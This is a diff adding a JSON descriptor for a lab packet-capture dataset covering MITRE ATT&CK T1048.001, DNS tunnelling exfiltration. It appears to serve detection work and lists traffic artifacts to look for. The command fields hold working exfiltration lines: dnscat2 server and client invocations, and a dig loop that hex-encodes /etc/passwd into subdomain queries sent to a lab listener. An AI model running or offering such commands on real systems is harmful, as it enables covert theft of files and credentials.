@@ -1,0 +1,137 @@
+{
+  "mitre": {
+    "technique_id": "T1048.001",
+    "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
+    "url": "https://attack.mitre.org/techniques/T1048/001/",
+    "tactics": ["TA0010"]
+  },
+  "description": "Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Symmetric encryption algorithms are those that use shared keys between the sender and receiver. To enable encryption, adversaries may build the symmetric key into the malware. Adversaries may abuse common protocols such as DNS to tunnel encrypted or encoded data out of the network.",
+  "artifacts": [
+    "high volume of DNS queries to a single second-level domain",
+    "DNS queries with abnormally long subdomain labels (often 30-63 characters, hex/base32/base64 encoded)",
+    "DNS A / TXT / CNAME query patterns inconsistent with normal browsing behavior",
+    "DNS traffic to non-corporate / non-resolver IP addresses (direct DNS to a controlled server on UDP/53)",
+    "TXT or CNAME responses carrying payload bytes from the controlled DNS server",
+    "long-lived UDP/53 conversation between a single client and a single external server",
+    "high entropy in DNS query labels (encrypted dnscat2 traffic)",
+    "hex-encoded payload chunks split across consecutive subdomain labels",
+    "DNS queries resolving to RFC1918 / fixed loopback addresses (e.g. 127.0.0.1) returned by the listener"
+  ],
+  "datasets": {
+    "pcaps": [
+      {
+        "id": "t1048.001-internal-auth-dns-exfil-small-dnscat2",
+        "file": "pcaps/techniques/t1048.001/t1048.001_internal_auth_dns_exfil_small__dnscat2.pcap",
+        "name": "Internal DNS exfiltration small payload - dnscat2",
+        "description": "Internal DNS tunneling exfiltration of a small payload using dnscat2 between a client and a controlled DNS listener for the exfil.packetfeeder.lab zone, showing encrypted DNS traffic on UDP/53 with high-entropy subdomain labels.",
+        "criticality": "high",
+        "scope": {
+          "protocol": "udp",
+          "ports": [53]
+        },
+        "filter": [
+          "internal",
+          "auth",
+          "dns",
+          "exfil",
+          "exfiltration",
+          "tunnel",
+          "dnscat2",
+          "encrypted",
+          "small",
+          "udp",
+          "53",
+          "high"
+        ],
+        "command": "# server: sudo ruby ./dnscat2.rb exfil.packetfeeder.lab\n# client: ./dnscat --dns server=172.16.10.40,domain=exfil.packetfeeder.lab"
+      },
+      {
+        "id": "t1048.001-internal-auth-dns-exfil-large-dnscat2",
+        "file": "pcaps/techniques/t1048.001/t1048.001_internal_auth_dns_exfil_large__dnscat2.pcap",
+        "name": "Internal DNS exfiltration large payload - dnscat2",
+        "description": "Internal DNS tunneling exfiltration of a large payload using dnscat2 between a client and a controlled DNS listener for the exfil.packetfeeder.lab zone, showing a sustained high-volume encrypted DNS conversation on UDP/53 with high-entropy subdomain labels.",
+        "criticality": "high",
+        "scope": {
+          "protocol": "udp",
+          "ports": [53]
+        },
+        "filter": [
+          "internal",
+          "auth",
+          "dns",
+          "exfil",
+          "exfiltration",
+          "tunnel",
+          "dnscat2",
+          "encrypted",
+          "large",
+          "udp",
+          "53",
+          "high"
+        ],
+        "command": "# server: sudo ruby ./dnscat2.rb exfil.packetfeeder.lab\n# client: ./dnscat --dns server=172.16.10.40,domain=exfil.packetfeeder.lab"
+      },
+      {
+        "id": "t1048.001-internal-auth-dns-exfil-hex-small-custom-dig",
+        "file": "pcaps/techniques/t1048.001/t1048.001_internal_auth_dns_exfil_hex_small__custom-dig.pcap",
+        "name": "Internal DNS exfiltration hex small payload - custom dig",
+        "description": "Internal DNS exfiltration of a small payload (/etc/passwd) using a custom shell script that hex-encodes file content (xxd -p), splits it into 60-byte chunks and emits one DNS query per chunk via dig towards a custom Python UDP/53 listener for the exfil.packetfeeder.lab zone.",
+        "criticality": "high",
+        "scope": {
+          "protocol": "udp",
+          "ports": [53]
+        },
+        "filter": [
+          "internal",
+          "auth",
+          "dns",
+          "exfil",
+          "exfiltration",
+          "tunnel",
+          "dig",
+          "custom",
+          "hex",
+          "xxd",
+          "small",
+          "udp",
+          "53",
+          "high"
+        ],
+        "command": "# client: while read line; do echo \"$line\" | xxd -p | fold -w 60 | while read chunk; do dig +short +timeout=1 +tries=1 \"$chunk.exfil.packetfeeder.lab\" @172.16.10.40; done; done < /etc/passwd\n# server: custom python3 UDP/53 listener that decodes the subdomain label and replies with 127.0.0.1 (A record)"
+      },
+      {
+        "id": "t1048.001-internal-auth-dns-exfil-hex-large-custom-dig",
+        "file": "pcaps/techniques/t1048.001/t1048.001_internal_auth_dns_exfil_hex_large__custom-dig.pcap",
+        "name": "Internal DNS exfiltration hex large payload - custom dig",
+        "description": "Internal DNS exfiltration of a large payload (/tmp/1mo.txt, ~1MB) using a custom shell script that hex-encodes file content (xxd -p), splits it into 60-byte chunks and emits one DNS query per chunk via dig towards a custom Python UDP/53 listener for the exfil.packetfeeder.lab zone, generating a high-volume burst of DNS queries.",
+        "criticality": "high",
+        "scope": {
+          "protocol": "udp",
+          "ports": [53]
+        },
+        "filter": [
+          "internal",
+          "auth",
+          "dns",
+          "exfil",
+          "exfiltration",
+          "tunnel",
+          "dig",
+          "custom",
+          "hex",
+          "xxd",
+          "large",
+          "udp",
+          "53",
+          "high"
+        ],
+        "command": "# client: while read line; do echo \"$line\" | xxd -p | fold -w 60 | while read chunk; do dig +short +timeout=1 +tries=1 \"$chunk.exfil.packetfeeder.lab\" @172.16.10.40; done; done < /tmp/1mo.txt\n# server: custom python3 UDP/53 listener that decodes the subdomain label and replies with 127.0.0.1 (A record)"
+      }
+    ]
+  },
+  "metadata": {
+    "domain": "enterprise",
+    "confidence": "high",
+    "schema_version": "1.0"
+  }
+}
